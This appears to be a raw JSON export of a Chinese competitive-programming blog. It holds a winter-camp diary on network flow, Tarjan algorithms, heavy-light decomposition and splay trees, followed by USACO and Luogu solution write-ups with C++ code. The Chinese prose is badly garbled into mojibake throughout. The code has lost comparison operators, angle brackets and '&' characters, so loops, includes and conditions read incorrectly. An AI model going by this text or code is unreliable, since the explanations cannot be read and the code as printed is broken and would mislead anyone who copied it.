2022.01.24}$ ä¸Šåˆå­¦ä¹ ç½‘ç»œæµï¼Œä¸­åˆçš„æ—¶å€™åˆ°ä¼šè®®é—´ä¸­åˆå¬äº†å¬ã€Šå¤šé‡æ—¶ç©ºä¸‹çš„ç®—æ³•ç«èµ›ã€‹ã€‚ æœ€å¤§æµç®—æ³•å¦™åœ¨å»ºç«‹åå‘è¾¹ï¼Œä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š $S \\to T$ æ‰¾åˆ°ä¸€æ¡å¢å¹¿è·¯ æ±‚å‡ºæµè·¯å¾„ä¸­è¾¹æƒæœ€å°çš„å€¼ ç»´æŠ¤è·¯å¾„ä¸­çš„åå‘è¾¹ é‡å¤æ“ä½œç›´åˆ° $S$ ä¸ $T$ ä¸å†è¿é€š äºæ˜¯é—®é¢˜å°±åœ¨äºå¦‚ä½•æ‰¾å¢å¹¿è·¯ï¼Œäºæ˜¯æœ‰ $\\textit{SAP}$ ç®—æ³•ï¼Œå³é‡å»ºè·ç¦»æ ‡å·ï¼Œå°†å›¾åˆ†æˆè‹¥å¹²ä¸ªâ€œå±‚æ¬¡â€ã€‚å…¶ä¸­åŒ…å«çš„ä¸¤ä¸ªä¼˜åŒ–å°±æ˜¯å¼§ä¼˜åŒ–ï¼ˆå¦‚æœä¸€æ¡è¾¹å·²ç»è¢«å¢å¹¿è¿‡ï¼Œé‚£ä¹ˆå®ƒå°±æ²¡æœ‰å¯èƒ½è¢«å¢å¹¿ç¬¬äºŒæ¬¡ï¼‰ä¸æ–­å±‚ä¼˜åŒ–ï¼ˆè‹¥å›¾ä¸Šå‡ºç°äº†æ–­å±‚ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•å†æ‰¾åˆ°å¢å¹¿è·¯ï¼Œåˆ™å¯ç›´æ¥ç»ˆæ­¢ç®—æ³•ï¼‰ã€‚ é‚£ä¹ˆè¿™ä¸ªç®—æ³•å¿«åœ¨å“ªé‡Œå‘¢ï¼Ÿé€šè¿‡æ¢å¯»æœ¬è´¨ï¼Œåªæœ‰å‡å°‘å†—ä½™ä»¥åŠé‡å¤åˆ©ç”¨å¯ä»¥æœ‰æ•ˆç¼©çŸ­æ—¶é—´ã€‚é‚£ä¹ˆè¯¥ç®—æ³•é€šè¿‡è·ç¦»æ ‡å·ï¼Œå°†åŸæ¥ç›¸äº’ç‹¬ç«‹çš„å¢å¹¿è·¯ç›¸äº’è”ç³»ï¼Œä»è€Œé‡å¤åˆ©ç”¨æ¥èŠ‚çœæ—¶é—´ã€‚ è´¹ç”¨æµä¸‹åˆå‘ç°è‡ªå·±å­¦è¿‡ tarjan äº†ï¼Œäºæ˜¯æƒ³å°±å¬å¬æ•°æ®ç»“æ„é€‰è®²ã€‚ä½†ä¸€æ‰“å¼€è¯¾ä»¶å°±å‘ç°éƒ½æ˜¯ä»€ä¹ˆ $\\texttt{IOI}$ é»‘é¢˜ï¼ŒåŠé€€äº†â€¦â€¦è¿˜æ˜¯å¬ tarjan å§ï¼ æ±‚ $\\texttt{LCA}$è‹¥ $\\texttt{LCA }(u,v) = k$ï¼Œå½“éå†å®Œ $u$ æ‰€åœ¨å­æ ‘åï¼Œ$u$ æ‰€åœ¨å­æ ‘æ‰€æœ‰çš„ç»“ç‚¹è·Ÿ $k$ å…¶å®ƒå­æ ‘æ‰€æœ‰ç»“ç‚¹çš„ $\\texttt{LCA}$ ä¸€å®šä¸º $k$ã€‚å¯ä»¥é€šè¿‡å¹¶æŸ¥é›†ç»´æŠ¤ã€‚ä¼ªä»£ç å¤§æ¦‚å¦‚ä¸‹ï¼š fa[v] = v;vis[v] = 1;for (i...) if (!vis[i]) dfs (i),fa[i] = v;for (v...) if (vis[u]) LCA[u][v] = LCA[v][u] = get_fa (u); è‹¥ $\\texttt{LCA }(u,v) = u$ï¼Œåœ¨ç»“ç‚¹ $u$ ä¿¡æ¯è¿”å›å‰ï¼Œ$u$ ç»“ç‚¹å­æ ‘å‡å·²è®¿é—®å®Œï¼Œæ•…ä¼ªä»£ç æ­¤æ—¶ä»ç„¶æˆç«‹ã€‚ ä¾‹é¢˜ codevs 1036 å•†åŠ¡é—®é¢˜ é¢˜é¢ä¸­å¼ºè°ƒä¸å­˜åœ¨ç¯ï¼Œæ•…è¿™æ˜¯ä¸€æ£µæ ‘ã€‚è€ƒè™‘æ ‘ä¸Šå·®åˆ†ï¼Œåˆ™æœ‰ $dis_{i,j}{\\min} = dep_i + dep_j - 2dep_{LCA(i,j)}$ã€‚ æ±‚å‰²ç‚¹è‹¥ $u$ ä¸ºç”Ÿæˆæ ‘çš„æ ¹ï¼Œåˆ™ $u$ ä¸ºå‰²ç‚¹çš„å……è¦æ¡ä»¶æ˜¯ $u$ çš„å­æ ‘ $\\ge 2$ã€‚ è‹¥ $u$ ä¸ä¸ºç”Ÿæˆæ ‘çš„æ ¹ï¼Œåˆ™ $u$ ä¸ºå‰²ç‚¹çš„å……è¦æ¡ä»¶æ˜¯åœ¨ $v$ æˆ– $v$ å­å­™ç»“ç‚¹å’Œ $u$ ç¥–å…ˆç»“ç‚¹ä¸å­˜åœ¨å›è¾¹ã€‚ å¯ä»¥ä½¿ç”¨æ—¶é—´æˆ³æ¥è®°å½•æ·±åº¦ä¼˜å…ˆæ•°ä¸æœ€ä½æ·±åº¦ï¼Œæœ‰ï¼š low[u] = \\min \\begin{cases} dfn[u]\\\\ \\min{(low[v]\\mid v \\texttt{ is children})}\\\\ \\min{(dfn[u]\\mid (u,v) \\texttt{ is cross edge})} \\end{cases}è‹¥ $u$ å­˜åœ¨ä¸€ä¸ªå­©å­ $v$ ä½¿å¾— $dfn[u] \\le low[v]$ï¼Œåˆ™ $u$ ä¸ºå‰²ç‚¹ã€‚ å‰²è¾¹è‹¥ $(u,v)$ ä¸ºå‰²è¾¹çš„å……è¦æ¡ä»¶æ˜¯ $u \\to v$ ä¸ä¸ºé‡è¾¹ä¸” $v$ æˆ– $v$ çš„å­å­™ç»“ç‚¹ä¸­æ²¡æœ‰æŒ‡å‘ $u$ æˆ– $u$ ç¥–å…ˆçš„å›è¾¹ã€‚è‹¥ $dfn[u] low[u]$ï¼Œåˆ™ $(u,v)$ ä¸ºå‰²è¾¹ï¼ˆä¸å‰²ç‚¹æ€æƒ³ç±»ä¼¼ï¼‰ã€‚ è¾¨æï¼š ä¸¤å‰²ç‚¹ä¹‹é—´çš„è¾¹ä¸€å®šä¸ºå‰²è¾¹ã€‚ é”™è¯¯ï¼åä¾‹å¦‚ä¸‹ï¼š A-B | | C-D | | E F $C,D$ ä¸ºå‰²ç‚¹ï¼Œä½† $(C,D)$ ä¸ä¸ºå‰²è¾¹ã€‚ å‰²è¾¹çš„ä¸¤ç«¯ç‚¹å‡ä¸ºå‰²ç‚¹ã€‚ é”™è¯¯ï¼åä¾‹å¦‚ä¸‹ï¼š A-B-C $(A,B)$ ä¸ºå‰²è¾¹ï¼Œä½† $A$ ä¸ä¸ºå‰²ç‚¹ã€‚ ä¾‹é¢˜ P5058 [ZJOI2004]å—…æ¢å™¨ è‹¥ $v$ ä¸ºå‰²ç‚¹ - å­æ ‘ä¸­å­˜åœ¨ $b$ - æ‰€æ±‚ä¹‹ç‚¹ å…³é”®åœ¨äºåˆ¤æ–­å­æ ‘ä¸­æ˜¯å¦å­˜åœ¨ $b$ï¼Œå¯ä»¥é€šè¿‡ $dfn[u]$ åˆ¤å®šã€‚è‹¥ $dfn[u] dfn[b]$ï¼Œåˆ™ç¬¦åˆæ¡ä»¶ã€‚ ä¾‹é¢˜ P7687 [CEOI2005] Critical Network Lines è¯¾åè¡¥é¢˜ï¼Œè§£æè§æˆ‘çš„åšæ–‡ ã€é¢˜è§£ã€‘P7687 [CEOI2005] Critical Network Lines ã€‚ å¼ºè¿é€šåˆ†é‡æ³¨æ„ï¼Œæ±‚å‰²ç‚¹ä¸å‰²è¾¹æ˜¯åœ¨æ— å‘å›¾ä¸­ï¼Œè€Œå¼ºè¿é€šåˆ†é‡æ˜¯åœ¨æœ‰å‘å›¾ä¸­ï¼Œè¦æ³¨æ„åŒºåˆ†ã€‚ è‹¥ $low[u] dfn[u]$ï¼Œåˆ™å­å­™ç»“ç‚¹èƒ½è¿åˆ°è‡ªå·±ä¸Šæ–¹çš„ç»“ç‚¹ï¼›è‹¥ $dfn[u] = dfn[u]$ï¼Œåˆ™ $u$ ä¸ºæ ¹ï¼Œå†…éƒ¨ä»å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªå¼ºè¿é€šåˆ†é‡ï¼Œé€’å½’æ±‚è§£å³å¯ã€‚ å½“ $low[u] = dfn[u]$ ä¸ºç»“æŸæ¡ä»¶è¿›è¡Œå¼¹æ ˆå¾—åˆ°å¼ºè¿é€šåˆ†é‡ã€‚ ä¾‹é¢˜ P2341 [USACO03FALL][HAOI2006]å—æ¬¢è¿çš„ç‰› G å·®ä¸å¤šå¯ä»¥è¯´æ˜¯æ¿å­é¢˜ï¼Œç¼©ç‚¹ååˆ¤æ–­æ˜¯å¦åªæœ‰ $1$ ä¸ªå‡ºåº¦ä¸º $0$ çš„ç‚¹ã€‚ æ™šä¸Šè¶ç€æ™šé¥­ååšäº†è¯¾ä¸Šè®²çš„ä¸€é“é¢˜ï¼Œå¹¶å†™äº†ç¯‡é¢˜è§£ã€‚ è¿˜æ˜¯è¥å‘˜äº¤æµï¼Œè¿˜æ˜¯å±äºå¬ä¸æ‡‚çš„çŠ¶æ€ã€‚ $\\texttt{Day 3}$ ç»“æŸã€‚ $\\texttt{Day 4 2022.01.25}$ ä¸Šåˆæ•°æ®ç»“æ„ä¸­çš„å¤æ‚æ ‘é—®é¢˜ï¼Œæ”¶è·å·¨å¤§ï¼ï¼ï¼é‡ç‚¹ä¸»è¦æ”¾åœ¨äº†å‰ä¸‰ä¸ªä¸­ï¼Œåé¢åŸºæœ¬å±äºæäº†æã€‚ æ ‘é“¾å‰–åˆ†è½»é‡é“¾å‰–åˆ†ã€‚ä¸€ä¸ªå®šä¹‰å°±æ˜¯é‡å­ç»“ç‚¹è¡¨ç¤ºå…¶å­ç»“ç‚¹ä¸­å­æ ‘æœ€å¤§çš„å­ç»“ç‚¹ã€‚ æ€§è´¨ â‘  åœ¨æ¯æ¡é‡é“¾ç»“ç‚¹çš„ dfn è¿ç»­ï¼Œå³ä¼˜å…ˆé€‰æ‹©é‡å­ç»“ç‚¹ã€‚â‘¡ æ¯ä¸ªå­æ ‘å†…çš„ dfn è¿ç»­ã€‚â‘¢ å‘ä¸‹ç»è¿‡ä¸€æ¡è½»è¾¹ï¼Œå­æ ‘å¤§å°è‡³å°‘å‡åŠï¼Œä¸è¶…è¿‡ $\\log n$ æ¡é‡é“¾ã€‚â‘£ é‡é“¾å¼€å¤´ä¸ä¸€å®šä¸ºé‡å­ç»“ç‚¹ã€‚ å»ºæ ‘è¿‡ç¨‹ void dfs1 (int u,int fa) sz[u] = 1;f[u] = fa;dep[u] = dep[fa] + 1; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v != fa) dfs1 (v,u); sz[u] += sz[v]; if (sz[v] sz[hson[u]]) hson[u] = v;//æ±‚é‡å„¿å­ æ ‘çš„åˆ†è§£ void dfs2 (int u,int fa) if (hson[u])//ä¼˜å…ˆèµ°é‡è¾¹ seg[hson[u]] = ++seg[0]; top[hson[u]] = top[u];//é‡é“¾çš„é¡¶ç«¯ rev[seg[0]] = hson[u]; dfs2 (hson[u],u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!top[v]) seg[v] = ++seg[0]; rev[seg[0]] = v; top[v] = v;//æ­¤æ—¶ (u,v) ä¸ºè½»è¾¹ï¼Œv ä¸ºæ‰€åœ¨é‡é“¾çš„é¡¶ç«¯ dfs2 (v,u); P3384 ã€æ¨¡æ¿ã€‘è½»é‡é“¾å‰–åˆ†/æ ‘é“¾å‰–åˆ† æ¨¡æ¿é¢˜ã€‚ ä¾‹é¢˜ P2590 [ZJOI2008]æ ‘çš„ç»Ÿè®¡ é€šè¿‡å‘ä¸Šè·³æ¥ç»´æŠ¤ä¿¡æ¯ã€‚è‹¥åœ¨é‡é“¾ä¸Šï¼Œåˆ™è·³åˆ°é¡¶ç«¯ï¼›è‹¥ä¸åœ¨åˆ™åœ¨å…¶é¡¶ç«¯å‘ä¸Šè·³ä¸€æ­¥è‡³é‡é“¾ã€‚ç›´åˆ°ä¸¤ç‚¹å‡åœ¨åŒä¸€æ¡é‡é“¾ä¸Šå³å¯ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š void ask (int u,int v) int fx = top[u],fy = top[v]; while (fx != fy) if (dep[fx] dep[fy]) swap (u,v),swap (fx,fy);//æ·±åº¦å¤§çš„å‘ä¸Šè·³ query (1,1,seg[0],seg[fx],seg[u]); u = f[fx],fx = top[u]; if (dep[u] dep[v]) swap (u,v); query (1,1,seg[0],seg[u],seg[v]);//åœ¨åŒä¸€æ¡é‡é“¾ä¸Šçš„ä¸åŒä½ç½®ï¼Œæœ€åéœ€å°†è¿™ä¸€æ®µåŒºé—´ä¹Ÿè¿›è¡Œæ±‚è§£ å†æ”¾ä¸€é“ç»ƒæ‰‹çš„é¢˜ç›®ï¼Œå‡ ä¹ä¹Ÿæ˜¯è£¸é¢˜ã€‚ P2146 [NOI2015] è½¯ä»¶åŒ…ç®¡ç†å™¨ æ”¯æŒä¸¤ç§æ“ä½œï¼Œæ ‘ä¸Šçš„åŒºé—´ä¿®æ”¹ä¸å­æ ‘çš„ä¿®æ”¹ã€‚æ³¨æ„å› ä¸ºæ¶‰åŠ $0$ å’Œ $1$ ä¸¤ç§æƒ…å†µï¼Œå› æ­¤æ‰“æ‡’æ ‡è®°çš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä¸‹ if (tmp[cur] == -1) return ;ï¼Œå½“ç„¶å¿½ç•¥è¿™ä¸ªè¯­å¥å°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜äº†ã€‚ ä¼¸å±•æ ‘ $\\texttt{splay}$å‡æ‘Šæ—¶é—´å¤æ‚åº¦ä¸º $O(\\log n)$ï¼Œé€šè¿‡åŠ¿èƒ½åˆ†æå¯ä»¥å¾—è¯ã€‚ä¼¸å±•æ ‘æœ‰ä¸€ä¸ªæ€§è´¨ï¼Œå°±æ˜¯ä¸­åºéå†ä¸ä¼šæ”¹å˜ã€‚ å³æ—‹ zig(x) å·¦æ—‹ zag(x) rotate å‡½æ•° splay å‡½æ•° æ’å…¥ æŸ¥æ‰¾ åˆ†è£‚ åˆå¹¶ åˆ é™¤ æ‰¾å¯»æ’åä¸º $k$ çš„æ•° åŒºé—´åˆ é™¤ ä¾‹é¢˜ P3391 ã€æ¨¡æ¿ã€‘æ–‡è‰ºå¹³è¡¡æ ‘ ä¾‹é¢˜ P3224 [HNOI2012]æ°¸æ— ä¹¡ ä¾‹é¢˜ P2042 [NOI2005] ç»´æŠ¤æ•°åˆ— ä¸‹åˆè¿˜æ˜¯å¬ã€Šæ–°ç‰ˆ $\\texttt{NOI-Linux}$ ç³»ç»Ÿä½¿ç”¨ã€‹æ¯”è¾ƒå®ç”¨å­ã€‚ åœ¨ç”µè„‘ä¸ŠæˆåŠŸè£…äº†ä¸€ä¸ª $\\texttt{NOI-Linux}$ è™šæ‹Ÿæœºï¼Œé’ˆä¸æˆ³ã€‚æ£é¼“äº†ä¸€ä¸‹åˆçš„è™šæ‹Ÿæœºï¼Œæ•ˆæœå¦‚ä¸‹ï¼š éå¸¸å¥½ï¼~~~ $\\texttt{Day 4}$ ç»“æŸã€‚ $\\texttt{Day 5 2022.01.26}$ ä¸Šåˆå¬ $\\texttt{IOI}$ å‘½é¢˜æ–¹å‘ã€‚åªæ˜¯åœç•™åœ¨å¬å¬çš„å±‚é¢ï¼Œä½†ä¸å¾—ä¸è¯´äº¤äº’é¢˜å’Œæ„é€ é¢˜ç­‰éä¼ ç»Ÿé¢˜å¯ä»¥è¯´æ˜¯å…´èµ·äº†ã€‚è¿˜çœ‹åˆ°äº†ä¸€äº›â€œæ¶æé¢˜â€ï¼Œå°è±¡æœ€æ·±çš„å°±æ˜¯ï¼š äººå·¥æ™ºèƒ½é¢˜ï¼Ÿé¢å‘æ•°æ®æ‰æ˜¯çœŸç†ï¼ MoMOOMoo é¢˜ å¥½åƒæœ‰ä¸ªè¥å‘˜å› â€œä¸æ–‡æ˜è¯­è¨€â€è¢«ç®¡ç†å‘˜è¸¢äº†â€¦å®³æ€• $\\texttt{.jpg}$ ä¸‹åˆåº”è¯¥æ˜¯å†¬ä»¤è¥çš„æœ€åä¸€èŠ‚è¯¾äº† $\\texttt{awa}$ï¼Œé¢˜ç›®é€‰è®²ï¼Œå¬å¬ç¥ä»™æ˜¯æ€ä¹ˆçˆ†åˆ‡ $\\texttt{IOI}$ çš„å­ã€‚ ä¼¼ä¹ä»Šå¤© $15:30$ å°±ç»“æŸäº†å“ˆï¼Œæ˜å¤©ç»“è¥æµ‹è¯•ï¼Œ$\\texttt{RP++}$ å§ï¼ æ™šä¸Šè¯•æœºï¼Œæ²¡å•¥å¤§é—®é¢˜ã€‚ $\\texttt{Day 5}$ ç»“æŸã€‚ $\\texttt{Day 6 2022.01.27}$ ä¸¤é“ä¼ ç»Ÿé¢˜ï¼Œä¸€é“äº¤äº’é¢˜ã€‚å…ˆå¼€äº† $\\texttt{T2}$ï¼Œç”¨ç©ºé—´æ¢æ—¶é—´æ‰“äº†ä¸€ä¸ª $O(nm)$ã€‚ç„¶åå‘ç°å•¥éƒ½ä¸ä¼šï¼Œäº¤äº’é¢˜ä¸»è¦ä¹‹å‰æ²¡æœ‰åšè¿‡ï¼Œæ‰€ä»¥å°±ä¸å¤ªä¼šæ ¼å¼ï¼Œæœ€ååº”è¯¥ $\\texttt{CE}$ äº†ã€‚æƒ³ç€è¿™æ ·è‚¯å®šä¹Ÿå°±ä¸èƒ½æ‹¿ç‰Œï¼Œæ‰€ä»¥ $\\texttt{T1}$ çš„ $\\texttt{25 pts}$ æœ€åä¹Ÿæ²¡æ‹¿ã€‚ $\\texttt{Day 7 2022.01.28}$ å¾ˆåæ‚”æ²¡æ‰“é‚£ä¸ªæš´åŠ›ï¼Œæœç„¶ $\\texttt{Fe}$ äº†ï¼Œè¢«å¡çº¿ $\\texttt{qwq}$ã€‚"},{"title":"é¢˜è§£ï¼šP7993 [USACO21DEC] Lonely Photo B","path":"/2022/01/01/P7993/","content":"é¦–å…ˆæ—¶æœ€ç®€å•çš„åšæ³•ï¼Œä¸¤å±‚å¾ªç¯é€ä¸€åˆ¤æ–­ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n^2)$ã€‚ä½†æ˜¯ç°åœ¨æ— æ³•é€šè¿‡æœ€åä¸€ä¸ªæ•°æ®ç‚¹ï¼Œéœ€è¦ä¼˜åŒ–ç¨‹åºã€‚ å¯¹äºä¸€ä¸ªä» $i$ å¼€å§‹çš„æƒ…å†µï¼Œé¦–å…ˆç”¨ä¸€æ¬¡äºŒåˆ†æ‰¾åˆ°æœ€è¿œçš„ç‚¹ç¬¦åˆåªå‡ºç° H æˆ– G çš„æƒ…å†µï¼Œè®¾ä¸º $l$ã€‚ç„¶åå†ç”¨ä¸€æ¬¡äºŒåˆ†æ‰¾åˆ°æœ€è¿œçš„ç‚¹ç¬¦åˆè¯¥åŒºé—´å†…åªæœ‰ä¸€ä¸ª H æˆ–ä¸€ä¸ª G çš„æƒ…å†µï¼Œè®¾ä¸º $r$ã€‚é‚£ä¹ˆç”±é¢˜ç›®çš„æ„æ€å¯çŸ¥ï¼Œ$[i,n]$ çš„åŒºé—´å¯¹ç­”æ¡ˆçš„è´¡çŒ®ä¸º $r - (l + 1) + 1 = r - l$ã€‚æ³¨æ„é¢˜ç›®çš„é™åˆ¶ï¼Œè¿ç»­çš„åŒºé—´ï¼Œé•¿åº¦ä¸å°äº $3$ï¼Œå› æ­¤ä¸€äº›ç‰¹æ®Šçš„åœ°æ–¹è¦è¿›è¡Œç‰¹åˆ¤ã€‚è¿™æ ·ï¼Œæ—¶é—´å¤æ‚åº¦å°±é™åˆ°äº† $O(n \\log n)$ï¼Œå¯ä»¥é€šè¿‡æœ¬é¢˜ã€‚ æ¥ä¸‹æ¥ç»™ä¸€ä¸‹ä»£ç ï¼šï¼ˆæ€è·¯æœ‰ç‚¹å¥‡æ€ªå˜¿å˜¿ï¼‰ #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,a[MAX],b[MAX];ll ans;char str[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); scanf (%s,str + 1); for (int i = 1;i = n;++i) if (str[i] == G) a[i] = a[i - 1] + 1,b[i] = b[i - 1]; else a[i] = a[i - 1],b[i] = b[i - 1] + 1; //å‰ç¼€å’Œç»´æŠ¤ä¸€æ®µåŒºé—´é‡Œ G æˆ– H çš„ä¸ªæ•° for (int i = 1;i = n;++i) int l = i + 2,r = n,st,end; if (l r) break; while (l = r)//ç¬¬ä¸€æ¬¡äºŒåˆ†æ‰¾åˆ° lï¼Œst = l + 1 int mid = (l + r) 1; if (a[mid] - a[i - 1] == mid - i + 1 || b[mid] - b[i - 1] == mid - i + 1) l = mid + 1; else r = mid - 1; --l; if (l i + 2) st = i + 2;//ç‰¹æ®Šæƒ…å†µ else st = l + 1; l = st,r = n; while (l = r)//ç¬¬äºŒæ¬¡äºŒåˆ†æ‰¾åˆ° end = r int mid = (l + r) 1; if (a[mid] - a[i - 1] == 1 || b[mid] - b[i - 1] == 1) l = mid + 1; else r = mid - 1; --l; end = l; ans += end - st + 1;//ç´¯è®¡è´¡çŒ® printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7995 [USACO21DEC] Walking Home B","path":"/2021/12/25/P7995/","content":"ä¸€é“å¾ˆæ™®é€šçš„è®¡æ•° $\\texttt{dp}$ã€‚è®¾ $dp_{i,j,k,l}$ è¡¨ç¤ºåœ¨ $(i,j)$ ä½ç½®ä¸Šï¼Œè¿˜å‰©ä¸‹ $k$ æ¬¡è¡Œèµ°æ–¹å‘æ”¹å˜ï¼Œå½“å‰çš„æ–¹å‘ä¸º $l$ æ—¶çš„æ–¹æ¡ˆæ•°ã€‚å› ä¸ºåªèƒ½å¤Ÿå‘ä¸‹èµ°ï¼Œåˆ™ä»¤ $l \\in \\{0,1\\}$ è¡¨ç¤ºè¿™ä¸¤ç§æ–¹å‘ã€‚é‚£ä¹ˆæ˜¾ç„¶ä»èµ·ç‚¹å¼€å§‹åˆå§‹åŒ–ï¼Œå¯¹äºä¸€ä¸ªè‰å †çš„æ ¼å­ï¼Œæ–¹æ¡ˆæ•°ä¸€å®šä¸º $0$ï¼Œå¯¹äºå…¶å®ƒæ ¼å­ï¼Œå°±ä¼šæœ‰æ›´æ”¹æ–¹å‘æˆ–ä¸æ›´æ”¹æ–¹å‘çš„ä¸¤ç§è½¬ç§»ï¼š for (int l = 0;l = k;++l) dp[i][j][0][l] += dp[i][j - 1][0][l]; dp[i][j][1][l] += dp[i - 1][j][1][l];//æ–¹å‘ä¸å˜ if (l == k) continue;//æ¬¡æ•°è€—å°½ dp[i][j][0][l] += dp[i][j - 1][1][l + 1]; dp[i][j][1][l] += dp[i - 1][j][0][l + 1];//æ›´æ”¹æ–¹å‘ æœ€åå°±æ˜¯ç­”æ¡ˆçš„ç»Ÿè®¡ï¼Œæ ¹æ®çŠ¶æ€çš„å«ä¹‰åˆ™æœ‰ $\\sum_{i = 1}^{K} dp_{n,n,i,0} + dp_{n,n,i,1}$ã€‚è¿™æ ·å°±è§£å†³äº†é—®é¢˜ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 55;const int MOD = 1e9 + 7;inline int read ();int t,n,k,ans,dp[MAX][MAX][2][5];char s[MAX][MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();k = read (); ans = 0; init (dp); for (int i = 1;i = n;++i) scanf (%s,s[i] + 1); if (s[1][2] != H) dp[1][2][0][k] = 1; if (s[2][1] != H) dp[2][1][1][k] = 1; for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) if (i == 1 j == 1) continue; if (i == 1 j == 2) continue; if (i == 2 j == 1) continue; if (s[i][j] == H) continue; for (int l = 0;l = k;++l) dp[i][j][0][l] += dp[i][j - 1][0][l]; dp[i][j][1][l] += dp[i - 1][j][1][l]; if (l == k) continue; dp[i][j][0][l] += dp[i][j - 1][1][l + 1]; dp[i][j][1][l] += dp[i - 1][j][0][l + 1]; for (int i = 0;i = k;++i) ans += dp[n][n][0][i] + dp[n][n][1][i]; printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7904 ã€ŒDCOIã€ç«çƒ§ã®äº‘","path":"/2021/12/09/P7904/","content":"æ±‚èµ·ç‚¹åˆ°ç»ˆç‚¹æ‰€èŠ±è´¹çš„æœ€çŸ­æ—¶é—´ï¼Œå¯ä»¥ç”¨ bfs æ¥è§£å†³é—®é¢˜ã€‚å¯¹äºä¸€ä¸ªç‚¹ï¼ŒåŒ…å«å››ä¸ªä¿¡æ¯ï¼Œåˆ†åˆ«æ˜¯æ¨ªçºµåæ ‡ã€å½“å‰èŠ±è´¹çš„æ—¶é—´å’Œæ–¹å‘ã€‚ç”±é¢˜å¯çŸ¥ï¼Œæœ‰è‹¥å¹²ä¸ªèµ·ç‚¹ï¼Œæ‰€ä»¥é¦–å…ˆæŠŠæ‰€æœ‰èµ·ç‚¹å‡åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å»ã€‚ä¸€å…±æœ‰å…«ç§ä¸åŒçš„å…³é”®å­—ç¬¦ï¼Œä¸€ä¸€åˆ—ä¸¾å³å¯ï¼Œæ³¨æ„åˆ¤æ–­è¾¹ç•Œçš„æ¡ä»¶ã€‚ # æ— æ³•é€šè¿‡ï¼Œå› æ­¤ç›´æ¥å‡ºé˜Ÿã€‚ S ä½œä¸ºèµ·ç‚¹ï¼Œå››ä¸ªæ–¹å‘å‡å¯ã€‚ E åˆ°è¾¾ç»ˆç‚¹ï¼Œæ›´æ–°ç­”æ¡ˆåå‡ºé˜Ÿã€‚ | ä¸ - è‹¥å¯ä»¥ç§»åŠ¨ï¼Œåˆ™ç›´è¡Œï¼›å¦åˆ™è½¬å‘ï¼Œå°†ä¸¤ä¸ªæ–¹å‘çš„æƒ…å†µåŠ å…¥é˜Ÿåˆ—ã€‚ / ä¸ \\ æŒ‰ç…§è¦æ±‚è½¬å‘ã€‚æ³¨æ„ï¼Œåœ¨æ‰“ \\ æ—¶éœ€è¦å†™æˆ if (str == \\\\) æ‰èƒ½è¿›è¡Œåˆ¤æ–­ã€‚ . ä¼šå‡ºç°ä¸‰ç§æƒ…å†µï¼Œä¾æ¬¡åŠ å…¥é˜Ÿåˆ—ã€‚ ^,v, ä¸ å‡ä¸ºå‰è¿›ç±»é“è·¯ï¼Œç¬¦åˆè¦æ±‚æ—¶å¯ä»¥å‰è¿›ä¸¤ä¸ªå•ä½ã€‚ ä½†æ˜¯è¿™æ ·è¿˜æ— æ³•é€šè¿‡æ­¤é¢˜ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªä¼˜åŒ–ã€‚ç¬¬ä¸€ä¸ªæ˜¾ç„¶æ˜¯é’ˆå¯¹é‡å¤èµ°çš„æƒ…å†µï¼Œæ¯ä¸ªæ ¼å­ä¸Šè®°å½•èµ°åˆ°è¯¥æ ¼å­çš„æœ€çŸ­æ—¶é—´ï¼Œç±»ä¼¼äºè®°å¿†åŒ–æœç´¢ï¼Œåªæœ‰æ¯”å½“å‰æƒ…å†µæ›´ä¼˜æ—¶å†ç»§ç»­åˆ¤æ–­åŠ å…¥é˜Ÿåˆ—ã€‚ç¬¬äºŒä¸ªæ˜¯ç”¨ä¼˜å…ˆé˜Ÿåˆ—ä¼˜åŒ–æ¥é˜²æ­¢è¶…æ—¶ï¼Œæ¯æ¬¡å‡ºé˜Ÿæ—¶ä¼˜å…ˆæ‰¾å‡ºèŠ±è´¹æ—¶é—´æœ€å°çš„æ¥ç»§ç»­æ›´æ–°ã€‚ å“¦å¯¹äº†ï¼Œè‹¥ç­”æ¡ˆä¸€ç›´æ— æ³•è¢«æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯æ— è§£çš„æƒ…å†µï¼Œæ­¤æ—¶è¦è®°å¾—ç‰¹åˆ¤è¾“å‡º $-1$ã€‚ äºæ˜¯ä¹ï¼Œä¸€é“å¤§æ¨¡æ‹Ÿåˆ°è¿™é‡Œå°±åšå¥½äº†ï¼ˆå®³å¾—æˆ‘äº¤äº†å‡ åéï¼Œèµ›æ—¶ä¹Ÿå°±å› ä¸ºæ²¡æœ‰ç¬¬äºŒä¸ªä¼˜åŒ–ä¸€ç›´ $45 \\texttt{pts}$ï¼‰ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include 